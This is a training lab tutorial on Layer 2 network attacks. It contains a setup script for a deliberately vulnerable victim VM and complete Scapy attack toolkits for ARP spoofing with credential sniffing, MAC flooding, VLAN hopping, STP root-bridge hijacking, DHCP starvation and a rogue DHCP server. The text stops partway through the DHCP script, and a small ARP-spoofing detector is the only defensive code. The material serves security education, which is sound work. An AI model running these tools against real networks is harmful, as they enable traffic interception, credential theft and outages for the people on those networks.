# Tutorial: Layer 2, Wireless, Telecom, and SDN Security — Hands-On Lab

> **Domain 9, Chapter 9B — Lab Companion**
> **Source document:** `domain9_chapter9B_l2_wireless_telecom_sdn.md`
> **Scope:** ARP spoofing, MAC flooding, VLAN hopping, STP manipulation, DHCP attacks, CDP/LLDP recon, MACsec, 802.1X bypass, WiFi (WPA2/WPA3, evil twin, deauth, PMKID, KRACK), Bluetooth (BIAS, KNOB, BLE relay, BLE GATT), NFC/RFID (MIFARE Classic, EMV relay, Proxmark3), SS7 (location tracking, SMS interception), Diameter, IMSI catchers, SIM swapping, 5G security (SUCI, 5G-AKA, SEPP), SDN (OpenFlow, controller attacks, flow table poisoning, VXLAN, micro-segmentation), eBPF/XDP, netfilter bypass.

---

## Lab Environment Setup

### Network Topology

```
                        ┌──────────────────────────┐
                        │    MANAGED SWITCH (SW1)   │
                        │   OpenFlow + VLAN + STP   │
                        │  Ports 1-8: Access VLAN10 │
                        │  Ports 9-10: Trunk        │
                        │  Port 11: Mirror/SPAN     │
                        └───┬───┬───┬───┬───┬──┬────┘
                            │   │   │   │   │  │
                 ┌──────────┘   │   │   │   │  └────────────┐
                 │              │   │   │   │               │
            ┌────┴────┐  ┌─────┴───┴───┴───┴─────┐   ┌─────┴────┐
            │  VM1    │  │    Linux Bridge (br0)  │   │  VM5     │
            │ VICTIM  │  │    OVS Software Switch │   │ SDN-CTRL │
            │10.9.2.10│  │    + OpenFlow agent    │   │10.9.2.50 │
            └─────────┘  └───┬──────┬──────┬──────┘   └──────────┘
                             │      │      │
                        ┌────┴──┐ ┌─┴────┐ ┌┴───────┐
                        │ VM2   │ │ VM3  │ │ VM4    │
                        │ATTACK │ │DETECT│ │WIRELESS│
                        │.9.2.20│ │.9.2.30│ │.9.2.40│
                        └───────┘ └──────┘ └────────┘

WiFi Lab Segment (air-gapped from wired):

    ┌──────────┐          ┌──────────┐         ┌──────────┐
    │ WiFi AP  │~~~air~~~~│ VM4      │~~~air~~~~│  Client  │
    │ (target) │          │ WIRELESS │          │  Device  │
    │HostAPD   │          │ mon mode │          │ supplicant│
    └──────────┘          └──────────┘         └──────────┘
```

### VM Specifications

| VM | Role | OS | NICs | RAM | Storage |
|----|------|----|------|-----|---------|
| VM1 | Victim / Target Host | Ubuntu 22.04 Server | 1× bridge, 1× VLAN trunk | 2 GB | 20 GB |
| VM2 | Attacker | Kali Linux 2024+ | 1× bridge, 1× VLAN trunk | 4 GB | 40 GB |
| VM3 | Detection / Defense | Ubuntu 22.04 | 1× bridge, 1× mirror port | 4 GB | 40 GB |
| VM4 | Wireless Lab | Kali Linux 2024+ | 1× bridge, 2× USB WiFi (monitor-capable), 1× USB BT (CSR-based) | 4 GB | 30 GB |
| VM5 | SDN Controller | Ubuntu 22.04 | 1× bridge, 1× management | 4 GB | 30 GB |

### Hardware Requirements for Wireless/BT/RFID Labs

| Device | Purpose | Exercises |
|--------|---------|-----------|
| Alfa AWUS036ACH (or ACM) | 802.11ac monitor mode + injection | Ex4-Ex8 |
| Alfa AWUS036NHA | 802.11n monitor/injection (AR9271) | Ex4-Ex8 |
| nRF52840 USB Dongle | BLE sniffing (Wireshark plugin) | Ex9 |
| Ubertooth One (optional) | BLE + BR/EDR sniffing | Ex9 |
| Proxmark3 Easy/RDV4 | RFID/NFC read/write/emulate | Ex10 |
| CSR-based USB BT dongle | Bluetooth HCI commands | Ex9 |

> **Note:** Wireless exercises require physical hardware — WiFi adapters with monitor mode and packet injection support. VMs alone cannot simulate RF. If hardware is unavailable, use pre-captured pcap files provided in `/opt/captures/` for analysis exercises.

---

### VM1 — Victim Setup

```bash
#!/bin/bash
# vm1_victim_setup.sh — Target services and vulnerable configurations

set -euo pipefail

# ── Network services ──

# Simple HTTP server with credentials form
apt-get update && apt-get install -y nginx php-fpm dnsmasq openssh-server \
    isc-dhcp-server vsftpd

# Nginx with login form (for credential capture demos)
cat > /etc/nginx/sites-available/default << 'NGINX'
server {
    listen 80;
    server_name lab.local;
    root /var/www/html;

    location /login {
        alias /var/www/html/login;
        index login.html;
    }

    location /api/login {
        proxy_pass http://127.0.0.1:8888;
    }
}
NGINX

mkdir -p /var/www/html/login
cat > /var/www/html/login/login.html << 'HTML'
<!DOCTYPE html>
<html><head><title>Lab Portal Login</title></head>
<body>
<h2>Employee Portal</h2>
<form action="/api/login" method="POST">
    <label>Username:</label><br>
    <input type="text" name="username" value=""><br>
    <label>Password:</label><br>
    <input type="password" name="password" value=""><br><br>
    <input type="submit" value="Login">
</form>
</body></html>
HTML

# Simple credential receiver
cat > /opt/login_server.py << 'PYSERVER'
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class LoginHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode()
        params = urllib.parse.parse_qs(body)
        user = params.get('username', [''])[0]
        print(f"[LOGIN] user={user}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Login successful")

HTTPServer(('127.0.0.1', 8888), LoginHandler).serve_forever()
PYSERVER
chmod +x /opt/login_server.py

systemctl restart nginx
python3 /opt/login_server.py &

# ── Vulnerable network parameters ──

# Enable IP forwarding (to simulate gateway)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Accept ICMP redirects (vulnerable)
sysctl -w net.ipv4.conf.all.accept_redirects=1
sysctl -w net.ipv4.conf.all.secure_redirects=0
sysctl -w net.ipv4.conf.all.send_redirects=1

# ARP table — small, easy to overflow
sysctl -w net.ipv4.neigh.default.gc_thresh1=64
sysctl -w net.ipv4.neigh.default.gc_thresh2=128
sysctl -w net.ipv4.neigh.default.gc_thresh3=256

# Accept gratuitous ARP
sysctl -w net.ipv4.conf.all.arp_accept=1

# DHCP client (to demonstrate starvation impact)
# The victim should get an IP via DHCP initially

# SSH with password auth enabled (for credential capture tests)
sed -i 's/^#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
systemctl restart sshd

# FTP with anonymous access (for sniffing demo)
cat > /etc/vsftpd.conf << 'VSFTPD'
listen=YES
anonymous_enable=YES
local_enable=YES
write_enable=NO
anon_root=/var/ftp
pasv_enable=YES
pasv_min_port=40000
pasv_max_port=40100
VSFTPD
mkdir -p /var/ftp/pub
echo "Confidential: Project Alpha budget Q4" > /var/ftp/pub/confidential.txt
systemctl restart vsftpd

echo "[+] VM1 victim setup complete"
```

---

### VM2 — Attacker Setup

```bash
#!/bin/bash
# vm2_attacker_setup.sh — Attack tools and scripts

set -euo pipefail

apt-get update && apt-get install -y \
    dsniff ettercap-text-only bettercap yersinia \
    scapy python3-scapy python3-pip \
    nmap hping3 macchanger vlan tcpdump \
    aircrack-ng mdk4 hostapd-wpe hashcat hcxtools hcxdumptool \
    reaver bully kismet \
    proxmark3 libnfc-bin mfoc \
    bluez bluetooth btscanner ubertooth \
    openvswitch-switch \
    fragrouter

pip3 install scapy netaddr

# ── Load 802.1Q VLAN module ──
modprobe 8021q

# ── Layer 2 attack scripts ──
mkdir -p /opt/attacks/{l2,wifi,bluetooth,rfid,sdn,telecom}

# ──────────────────────────────────────────────────────────────
# ARP SPOOFING TOOLKIT
# ──────────────────────────────────────────────────────────────
cat > /opt/attacks/l2/arp_spoof.py << 'ARPSPOOF'
#!/usr/bin/env python3
"""
ARP Spoofing / MitM toolkit.
Full-duplex ARP cache poisoning with automatic forwarding,
credential sniffing, and cleanup on exit.
"""
import sys
import signal
import time
import threading
from scapy.all import (
    Ether, ARP, IP, TCP, Raw,
    sendp, sniff, get_if_hwaddr, getmacbyip,
    conf
)

class ARPSpoofer:
    def __init__(self, interface, victim_ip, gateway_ip):
        self.iface = interface
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.attacker_mac = get_if_hwaddr(interface)
        self.victim_mac = None
        self.gateway_mac = None
        self.running = False
        self.packets_forwarded = 0

    def resolve_macs(self):
        print(f"[*] Resolving MAC for {self.victim_ip}...")
        self.victim_mac = getmacbyip(self.victim_ip)
        if not self.victim_mac:
            print(f"[-] Cannot resolve MAC for {self.victim_ip}")
            sys.exit(1)
        print(f"    → {self.victim_mac}")

        print(f"[*] Resolving MAC for {self.gateway_ip}...")
        self.gateway_mac = getmacbyip(self.gateway_ip)
        if not self.gateway_mac:
            print(f"[-] Cannot resolve MAC for {self.gateway_ip}")
            sys.exit(1)
        print(f"    → {self.gateway_mac}")

    def _poison_pkt(self, target_ip, target_mac, spoof_ip):
        return Ether(dst=target_mac, src=self.attacker_mac) / ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip,
            hwsrc=self.attacker_mac
        )

    def poison_loop(self):
        pkt_to_victim = self._poison_pkt(
            self.victim_ip, self.victim_mac, self.gateway_ip
        )
        pkt_to_gateway = self._poison_pkt(
            self.gateway_ip, self.gateway_mac, self.victim_ip
        )
        print("[+] ARP poisoning started (Ctrl+C to stop)")
        while self.running:
            sendp(pkt_to_victim, iface=self.iface, verbose=False)
            sendp(pkt_to_gateway, iface=self.iface, verbose=False)
            time.sleep(2)

    def restore_arp(self):
        print("\n[*] Restoring ARP tables...")
        restore_victim = Ether(dst=self.victim_mac) / ARP(
            op=2,
            pdst=self.victim_ip,
            hwdst=self.victim_mac,
            psrc=self.gateway_ip,
            hwsrc=self.gateway_mac
        )
        restore_gateway = Ether(dst=self.gateway_mac) / ARP(
            op=2,
            pdst=self.gateway_ip,
            hwdst=self.gateway_mac,
            psrc=self.victim_ip,
            hwsrc=self.victim_mac
        )
        for _ in range(5):
            sendp(restore_victim, iface=self.iface, verbose=False)
            sendp(restore_gateway, iface=self.iface, verbose=False)
            time.sleep(0.5)
        print("[+] ARP tables restored")

    def credential_sniffer(self):
        def process_pkt(pkt):
            if pkt.haslayer(TCP) and pkt.haslayer(Raw):
                payload = pkt[Raw].load.decode(errors='ignore')
                for keyword in ['user', 'pass', 'login', 'auth', 'token',
                                'USER ', 'PASS ']:
                    if keyword.lower() in payload.lower():
                        src = pkt[IP].src if pkt.haslayer(IP) else '?'
                        dst = pkt[IP].dst if pkt.haslayer(IP) else '?'
                        dport = pkt[TCP].dport
                        print(f"\n[CRED] {src} → {dst}:{dport}")
                        for line in payload.split('\n'):
                            low = line.lower()
                            if any(k in low for k in ['user', 'pass', 'login']):
                                print(f"       {line.strip()}")
                        break

        print("[*] Credential sniffer active (HTTP, FTP, Telnet)")
        sniff(
            iface=self.iface,
            filter=f"host {self.victim_ip} and tcp",
            prn=process_pkt,
            store=False,
            stop_filter=lambda _: not self.running
        )

    def start(self):
        self.resolve_macs()
        self.running = True

        poison_thread = threading.Thread(target=self.poison_loop, daemon=True)
        poison_thread.start()

        try:
            self.credential_sniffer()
        except KeyboardInterrupt:
            pass
        finally:
            self.running = False
            self.restore_arp()


def detect_arp_anomalies(interface, duration=60):
    """Passive ARP anomaly detector — run on defender side."""
    ip_mac_map = {}
    alerts = []

    def check_arp(pkt):
        if pkt.haslayer(ARP) and pkt[ARP].op == 2:
            src_ip = pkt[ARP].psrc
            src_mac = pkt[ARP].hwsrc

            if src_ip in ip_mac_map:
                if ip_mac_map[src_ip] != src_mac:
                    alert = (
                        f"[ALERT] ARP SPOOF DETECTED! "
                        f"IP {src_ip}: MAC changed "
                        f"{ip_mac_map[src_ip]} → {src_mac}"
                    )
                    print(alert)
                    alerts.append(alert)
            ip_mac_map[src_ip] = src_mac

    print(f"[*] Monitoring ARP on {interface} for {duration}s...")
    sniff(iface=interface, filter="arp", prn=check_arp,
          timeout=duration, store=False)
    return alerts


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='ARP Spoofing Toolkit')
    sub = parser.add_subparsers(dest='mode')

    atk = sub.add_parser('attack', help='Full-duplex ARP MitM')
    atk.add_argument('-i', '--interface', required=True)
    atk.add_argument('-v', '--victim', required=True)
    atk.add_argument('-g', '--gateway', required=True)

    det = sub.add_parser('detect', help='Passive ARP anomaly detector')
    det.add_argument('-i', '--interface', required=True)
    det.add_argument('-t', '--time', type=int, default=60)

    args = parser.parse_args()

    if args.mode == 'attack':
        spoofer = ARPSpoofer(args.interface, args.victim, args.gateway)
        spoofer.start()
    elif args.mode == 'detect':
        detect_arp_anomalies(args.interface, args.time)
    else:
        parser.print_help()
ARPSPOOF
chmod +x /opt/attacks/l2/arp_spoof.py


# ──────────────────────────────────────────────────────────────
# MAC FLOODING
# ──────────────────────────────────────────────────────────────
cat > /opt/attacks/l2/mac_flood.py << 'MACFLOOD'
#!/usr/bin/env python3
"""
CAM table flooding attack.
Generates packets with random source MACs to overflow the switch
CAM table, forcing hub-mode behavior (all frames flooded to all ports).
"""
import sys
import time
import argparse
from scapy.all import Ether, IP, ICMP, RandMAC, RandIP, sendp

def mac_flood(interface, count=50000, burst_size=500, delay=0.01):
    print(f"[*] MAC flooding on {interface}: {count} frames")
    print(f"    Burst size: {burst_size}, inter-burst delay: {delay}s")
    sent = 0
    batch = []

    for i in range(count):
        pkt = Ether(src=RandMAC(), dst=RandMAC()) / \
              IP(src=RandIP(), dst=RandIP()) / \
              ICMP()
        batch.append(pkt)

        if len(batch) >= burst_size:
            sendp(batch, iface=interface, verbose=False)
            sent += len(batch)
            batch = []
            if sent % 5000 == 0:
                print(f"    Sent {sent}/{count} frames")
            time.sleep(delay)

    if batch:
        sendp(batch, iface=interface, verbose=False)
        sent += len(batch)

    print(f"[+] MAC flood complete: {sent} frames sent")


def verify_flooding(interface, target_ip, timeout=10):
    """After CAM overflow, sniff for traffic not destined to us."""
    from scapy.all import sniff, get_if_hwaddr
    our_mac = get_if_hwaddr(interface)
    foreign_count = 0

    def check_pkt(pkt):
        nonlocal foreign_count
        if pkt.haslayer(Ether):
            if pkt[Ether].dst != our_mac and \
               pkt[Ether].dst != 'ff:ff:ff:ff:ff:ff':
                foreign_count += 1

    print(f"[*] Verifying hub-mode: sniffing for foreign unicast on {interface}")
    sniff(iface=interface, prn=check_pkt, timeout=timeout, store=False)

    if foreign_count > 0:
        print(f"[+] SUCCESS: Captured {foreign_count} unicast frames not addressed to us")
        print(f"    Switch is in hub mode (CAM table overflowed)")
    else:
        print(f"[-] No foreign unicast captured — CAM overflow may not have succeeded")
        print(f"    Port security may be enabled on the switch")

    return foreign_count


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='MAC Flood / CAM Overflow')
    parser.add_argument('-i', '--interface', required=True)
    parser.add_argument('-c', '--count', type=int, default=50000)
    parser.add_argument('-b', '--burst', type=int, default=500)
    parser.add_argument('--verify', action='store_true',
                        help='Verify hub-mode after flooding')
    args = parser.parse_args()

    mac_flood(args.interface, args.count, args.burst)
    if args.verify:
        verify_flooding(args.interface, '10.9.2.10')
MACFLOOD
chmod +x /opt/attacks/l2/mac_flood.py


# ──────────────────────────────────────────────────────────────
# VLAN HOPPING (DTP + DOUBLE TAGGING)
# ──────────────────────────────────────────────────────────────
cat > /opt/attacks/l2/vlan_hop.py << 'VLANHOP'
#!/usr/bin/env python3
"""
VLAN hopping attacks:
1. DTP trunk negotiation (switch spoofing)
2. Double-tagging (802.1Q-in-802.1Q)
"""
import sys
import time
import argparse
from scapy.all import (
    Ether, Dot1Q, IP, ICMP, UDP, Raw,
    sendp, sniff, get_if_hwaddr, conf
)

class DTPNegotiator:
    """
    Send DTP (Dynamic Trunking Protocol) frames to negotiate
    a trunk on an access port left in 'dynamic auto/desirable' mode.
    DTP uses LLC SNAP encapsulation with OUI 0x00000c and PID 0x2004.
    """
    DTP_MCAST = "01:00:0c:cc:cc:cc"

    def __init__(self, interface):
        self.iface = interface
        self.our_mac = get_if_hwaddr(interface)

    def send_dtp_desirable(self, count=30, interval=1):
        print(f"[*] Sending DTP Desirable frames on {self.iface}")
        print(f"    Attempting trunk negotiation...")

        # DTP frame structure (simplified — Scapy doesn't have native DTP)
        # LLC/SNAP header + DTP payload
        llc_snap = bytes([
            0xaa, 0xaa, 0x03,       # LLC: DSAP=AA, SSAP=AA, Control=03 (SNAP)
            0x00, 0x00, 0x0c,       # OUI: Cisco
            0x20, 0x04,             # PID: DTP (0x2004)
        ])

        # DTP payload (version 1, type desirable)
        dtp_payload = bytes([
            0x01,                   # Version 1
            # Domain TLV (type=0x0001)
            0x00, 0x01, 0x00, 0x05, 0x00,  # Empty domain
            # Status TLV (type=0x0002) — trunk desirable
            0x00, 0x02, 0x00, 0x05, 0x03,  # DTP type: desirable + ISL/802.1Q
            # DTP Type TLV (type=0x0003) — 802.1Q
            0x00, 0x03, 0x00, 0x05, 0xa5,
            # Neighbor TLV (type=0x0004)
            0x00, 0x04, 0x00, 0x0a,
        ])
        dtp_payload += bytes.fromhex(self.our_mac.replace(':', ''))

        for i in range(count):
            pkt = Ether(
                dst=self.DTP_MCAST,
                src=self.our_mac,
                type=len(llc_snap) + len(dtp_payload)
            ) / Raw(load=llc_snap + dtp_payload)

            sendp(pkt, iface=self.iface, verbose=False)
            if i % 10 == 0:
                print(f"    Sent {i+1}/{count} DTP frames")
            time.sleep(interval)

        print("[+] DTP negotiation frames sent")
        print("    Check if trunk formed: 'ip -d link show' for VLAN sub-interfaces")


class DoubleTagAttack:
    """
    Double-tagging (802.1Q-in-Q) VLAN hopping.
    Outer tag = native VLAN (stripped by first switch).
    Inner tag = target VLAN (forwarded to target VLAN).
    Attack is UNIDIRECTIONAL — no return path via same mechanism.
    """
    def __init__(self, interface, native_vlan, target_vlan):
        self.iface = interface
        self.native_vlan = native_vlan
        self.target_vlan = target_vlan

    def send_double_tagged(self, dst_ip, payload_msg="VLAN-HOP-TEST",
                           count=5):
        print(f"[*] Double-tagging attack:")
        print(f"    Native VLAN (outer): {self.native_vlan}")
        print(f"    Target VLAN (inner): {self.target_vlan}")
        print(f"    Destination IP: {dst_ip}")

        for i in range(count):
            # Frame with two 802.1Q headers
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                  Dot1Q(vlan=self.native_vlan) / \
                  Dot1Q(vlan=self.target_vlan) / \
                  IP(dst=dst_ip) / \
                  ICMP() / \
                  Raw(load=payload_msg.encode())

            sendp(pkt, iface=self.iface, verbose=False)

        print(f"[+] Sent {count} double-tagged frames")
        print(f"    If switch native VLAN = {self.native_vlan},")
        print(f"    frames should reach VLAN {self.target_vlan}")

    def send_double_tagged_udp(self, dst_ip, dst_port=9999,
                                message="VLAN_HOP_PAYLOAD"):
        """Send UDP payload to prove data reaches target VLAN."""
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / \
              Dot1Q(vlan=self.native_vlan) / \
              Dot1Q(vlan=self.target_vlan) / \
              IP(dst=dst_ip) / \
              UDP(dport=dst_port) / \
              Raw(load=message.encode())

        sendp(pkt, iface=self.iface, verbose=False)
        print(f"[+] Sent double-tagged UDP to {dst_ip}:{dst_port}")


def create_vlan_interface(base_iface, vlan_id, ip_addr=None):
    """Create VLAN sub-interface after trunk negotiation succeeds."""
    import subprocess
    vlan_iface = f"{base_iface}.{vlan_id}"
    subprocess.run(['ip', 'link', 'add', 'link', base_iface,
                    'name', vlan_iface, 'type', 'vlan', 'id', str(vlan_id)],
                   check=True)
    subprocess.run(['ip', 'link', 'set', vlan_iface, 'up'], check=True)
    if ip_addr:
        subprocess.run(['ip', 'addr', 'add', ip_addr, 'dev', vlan_iface],
                       check=True)
    print(f"[+] Created VLAN interface {vlan_iface}")
    if ip_addr:
        print(f"    IP: {ip_addr}")
    return vlan_iface


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='VLAN Hopping Attacks')
    sub = parser.add_subparsers(dest='mode')

    dtp = sub.add_parser('dtp', help='DTP trunk negotiation')
    dtp.add_argument('-i', '--interface', required=True)
    dtp.add_argument('-c', '--count', type=int, default=30)

    dtag = sub.add_parser('doubletag', help='Double-tagging attack')
    dtag.add_argument('-i', '--interface', required=True)
    dtag.add_argument('--native', type=int, required=True,
                      help='Native VLAN ID (outer tag)')
    dtag.add_argument('--target', type=int, required=True,
                      help='Target VLAN ID (inner tag)')
    dtag.add_argument('--dst', required=True, help='Destination IP')

    vif = sub.add_parser('vlan-iface', help='Create VLAN sub-interface')
    vif.add_argument('-i', '--interface', required=True)
    vif.add_argument('--vlan', type=int, required=True)
    vif.add_argument('--ip', help='IP address (CIDR)')

    args = parser.parse_args()

    if args.mode == 'dtp':
        dtp_neg = DTPNegotiator(args.interface)
        dtp_neg.send_dtp_desirable(args.count)
    elif args.mode == 'doubletag':
        dtag_atk = DoubleTagAttack(args.interface, args.native, args.target)
        dtag_atk.send_double_tagged(args.dst)
    elif args.mode == 'vlan-iface':
        create_vlan_interface(args.interface, args.vlan, args.ip)
    else:
        parser.print_help()
VLANHOP
chmod +x /opt/attacks/l2/vlan_hop.py


# ──────────────────────────────────────────────────────────────
# STP ROOT BRIDGE HIJACK
# ──────────────────────────────────────────────────────────────
cat > /opt/attacks/l2/stp_attack.py << 'STPATTACK'
#!/usr/bin/env python3
"""
STP root bridge hijacking.
Injects BPDUs with priority 0 to claim the root bridge role,
causing all switch-to-switch traffic to route through the attacker.
"""
import time
import argparse
from scapy.all import (
    Ether, LLC, STP, Dot3,
    sendp, sniff, get_if_hwaddr
)

class STPAttacker:
    STP_MCAST = "01:80:c2:00:00:00"

    def __init__(self, interface):
        self.iface = interface
        self.our_mac = get_if_hwaddr(interface)

    def claim_root(self, duration=60, interval=2):
        """Send BPDUs with priority 0 to become root bridge."""
        print(f"[*] STP Root Bridge Hijack on {self.iface}")
        print(f"    Attacker MAC: {self.our_mac}")
        print(f"    Bridge priority: 0 (lowest = becomes root)")
        print(f"    Duration: {duration}s, interval: {interval}s")

        bpdu = Dot3(dst=self.STP_MCAST, src=self.our_mac) / \
               LLC(dsap=0x42, ssap=0x42, ctrl=0x03) / \
               STP(
                   rootid=0,
                   rootmac=self.our_mac,
                   bridgeid=0,
                   bridgemac=self.our_mac,
                   portid=0x8001,
                   pathcost=0,
                   maxage=20,
                   hellotime=2,
                   fwddelay=15
               )

        end_time = time.time() + duration
        count = 0
        while time.time() < end_time:
            sendp(bpdu, iface=self.iface, verbose=False)
            count += 1
            if count % 10 == 0:
                print(f"    Sent {count} BPDUs")
            time.sleep(interval)

        print(f"[+] STP attack complete: {count} BPDUs sent")

    def tcn_flood(self, duration=30, rate=0.1):
        """Flood TCN (Topology Change Notification) BPDUs.
        Forces all switches to shorten their MAC aging timers,
        increasing broadcast traffic and potentially causing
        connectivity disruption."""
        print(f"[*] TCN flood on {self.iface} for {duration}s")

        tcn = Dot3(dst=self.STP_MCAST, src=self.our_mac) / \
              LLC(dsap=0x42, ssap=0x42, ctrl=0x03) / \
              STP(bpdutype=0x80)  # TCN BPDU

        end_time = time.time() + duration
        count = 0
        while time.time() < end_time:
            sendp(tcn, iface=self.iface, verbose=False)
            count += 1
            time.sleep(rate)

        print(f"[+] TCN flood complete: {count} TCN BPDUs sent")

    def monitor_bpdus(self, duration=30):
        """Passive BPDU monitor — identify current root bridge."""
        bridges = {}

        def process_bpdu(pkt):
            if pkt.haslayer(STP):
                stp = pkt[STP]
                bridge_id = f"{stp.bridgeid}:{stp.bridgemac}"
                root_id = f"{stp.rootid}:{stp.rootmac}"
                if bridge_id not in bridges:
                    print(f"\n[BPDU] Bridge: {bridge_id}")
                    print(f"       Root:   {root_id}")
                    print(f"       Cost:   {stp.pathcost}")
                    bridges[bridge_id] = {
                        'root': root_id,
                        'cost': stp.pathcost
                    }

        print(f"[*] Monitoring BPDUs on {self.iface} for {duration}s")
        sniff(
            iface=self.iface,
            filter="ether dst 01:80:c2:00:00:00",
            prn=process_bpdu,
            timeout=duration,
            store=False
        )

        if bridges:
            print(f"\n[+] Discovered {len(bridges)} bridge(s)")
            # Find current root
            roots = set(b['root'] for b in bridges.values())
            for r in roots:
                print(f"    Current root: {r}")
        else:
            print("[-] No BPDUs captured — STP may be disabled")

        return bridges


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='STP Attack Toolkit')
    sub = parser.add_subparsers(dest='mode')

    root = sub.add_parser('root', help='Claim root bridge')
    root.add_argument('-i', '--interface', required=True)
    root.add_argument('-d', '--duration', type=int, default=60)

    tcn = sub.add_parser('tcn', help='TCN flood')
    tcn.add_argument('-i', '--interface', required=True)
    tcn.add_argument('-d', '--duration', type=int, default=30)

    mon = sub.add_parser('monitor', help='Monitor BPDUs')
    mon.add_argument('-i', '--interface', required=True)
    mon.add_argument('-d', '--duration', type=int, default=30)

    args = parser.parse_args()

    atk = STPAttacker(args.interface)
    if args.mode == 'root':
        atk.claim_root(args.duration)
    elif args.mode == 'tcn':
        atk.tcn_flood(args.duration)
    elif args.mode == 'monitor':
        atk.monitor_bpdus(args.duration)
    else:
        parser.print_help()
STPATTACK
chmod +x /opt/attacks/l2/stp_attack.py


# ──────────────────────────────────────────────────────────────
# DHCP ATTACKS (STARVATION + ROGUE SERVER)
# ──────────────────────────────────────────────────────────────
cat > /opt/attacks/l2/dhcp_attack.py << 'DHCPATTACK'
#!/usr/bin/env python3
"""
DHCP Attack Toolkit:
1. DHCP Starvation — exhaust IP pool with random MAC DHCP Discovers
2. Rogue DHCP Server — respond to clients with attacker-controlled config
"""
import random
import time
import argparse
import threading
from scapy.all import (
    Ether, IP, UDP, BOOTP, DHCP, Raw,
    sendp, sniff, RandMAC, mac2str,
    get_if_hwaddr, conf
)

class DHCPStarvation:
    def __init__(self, interface, count=254):
        self.iface = interface
        self.count = count
        self.leases_acquired = 0

    def starve(self):
        print(f"[*] DHCP Starvation: sending {self.count} DISCOVER with random MACs")

        for i in range(self.count):
            src_mac = str(RandMAC())
            chaddr = mac2str(src_mac) + b'\x00' * 10  # pad to 16 bytes

            pkt = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") / \
                  IP(src="0.0.0.0", dst="255.255.255.255") / \
                  UDP(sport=68, dport=67) / \
                  BOOTP(
                      chaddr=chaddr,
                      xid=random.randint(1, 0xFFFFFFFF)
                  ) / \
                  DHCP(options=[
                      ("message-type", "discover"),
                      ("hostname", f"host-{i:03d}"),
                      "end"
                  ])

            sendp(pkt, iface=self.iface, verbose=False)

            if (i + 1) % 50 == 0:
                print(f"    Sent {i+1}/{self.count} DHCP Discovers")
                time.sleep(0.1)

        print(f"[+] DHCP Starvation complete: {self.count} Discovers sent")
        print("    Legitimate clients should now fail to get an IP")


class RogueDHCPServer:
    def __init__(self, interface, pool_start, pool_end, gateway, dns,
                 subnet="255.255.255.0", lease_time=3600):
        self.iface = interface
        self.pool_start = pool_start
        self.pool_end = pool_end
        self.gateway = gateway
        self.dns = dns
        self.subnet = subnet
        self.lease_time = lease_time
        self.server_mac = get_if_hwaddr(interface)
        self.next_ip_offset = 0
        self.running = False

    def _next_ip(self):
        parts = self.pool_start.split('.')
        base = int(parts[3])
        ip = f"{parts[0]}.{parts[1]}.{parts[2]}.{base + self.next_ip_offset}"
        self.next_ip_offset += 1
        return ip

    def handle_discover(self, pkt):
        if not pkt.haslayer(DHCP):
            return
        msg_type = None
        for opt in pkt[DHCP].options:
            if isinstance(opt, tuple) and opt[0] == 'message-type':
                msg_type = opt[1]
                break

        if msg_type == 1:  # DISCOVER
            offered_ip = self._next_ip()
            client_mac = pkt[Ether].src
            xid = pkt[BOOTP].xid

            offer = Ether(dst=client_mac, src=self.server_mac) / \
                    IP(src=self.gateway, dst="255.255.255.255") / \
                    UDP(sport=67, dport=68) / \
                    BOOTP(
                        op=2, xid=xid,
                        yiaddr=offered_ip,
                        siaddr=self.gateway,
                        chaddr=pkt[BOOTP].chaddr
                    ) / \
                    DHCP(options=[
                        ("message-type", "offer"),
                        ("server_id", self.gateway),
                        ("lease_time", self.lease_time),
                        ("subnet_mask", self.subnet),
                        ("router", self.gateway),
                        ("name_server", self.dns),
                        "end"
                    ])

            sendp(offer, iface=self.iface, verbose=False)
            print(f"[ROGUE] OFFER {offered_ip} → {client_mac}")

        elif msg_type == 3:  # REQUEST
            client_mac = pkt[Ether].src
            xid = pkt[BOOTP].xid
            requested_ip = None
            for opt in pkt[DHCP].options:
                if isinstance(opt, tuple) and opt[0] == 'requested_addr':
                    requested_ip = opt[1]

            if requested_ip:
                ack = Ether(dst=client_mac, src=self.server_mac) / \
                      IP(src=self.gateway, dst="255.255.255.255") / \
                      UDP(sport=67, dport=68) / \
                      BOOTP(
                          op=2, xid=xid,
                          yiaddr=requested_ip,
                          siaddr=self.gateway,
                          chaddr=pkt[BOOTP].chaddr
                      ) / \
                      DHCP(options=[
                          ("message-type", "ack"),
                          ("server_id", self.gateway),
                          ("lease_time", self.lease_time),
                          ("subnet_mask", self.subnet),
                          ("router", self.gateway),
                          ("name_server", self.dns),
                          "end"
                      ])

                sendp(ack, iface=self.iface, verbose=False)
                print(f"[ROGUE] ACK {requested_ip} → {client_mac}")
                print(f"        Gateway: {self.gateway} (ATTACKER)")
                print(f"        DNS:     {self.dns} (ATTACKER)")

    def start(self):
        self.running = True
        print(f"[*] Rogue DHCP Server active on {self.iface}")
        print(f"    Pool: {self.pool_start} - {self.pool_end}")
        print(f"    Gateway (MitM): {self.gateway}")
        print(f"    DNS (poisoned): {self.dns}")
        print(f"    Ctrl+C to stop\n")

        try:
            sniff(
                iface=self.iface,
                filter="udp and (port 67 or port 68)",
                prn=self.handle_discover,
                store=False,
                stop_filter=lambda _: not self.running
            )
        except KeyboardInterrupt:
            self.running = False
            print("\n[*] Rogue DHCP server stopped")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='DHCP Attack Toolkit')
    sub = parser.add_subparsers(dest='mode')

    starve = sub.add_parser('starve', help='DHCP pool starvation')
    starve.add_argument('-i', '--interface', required=True)
    starve.add_argument('-c', '--count', type=int, default=254)

    rogue = sub.add_parser('rogue', help='Rogue DHCP server')
    rogue.add_argument('-i', '--interface', required=True)
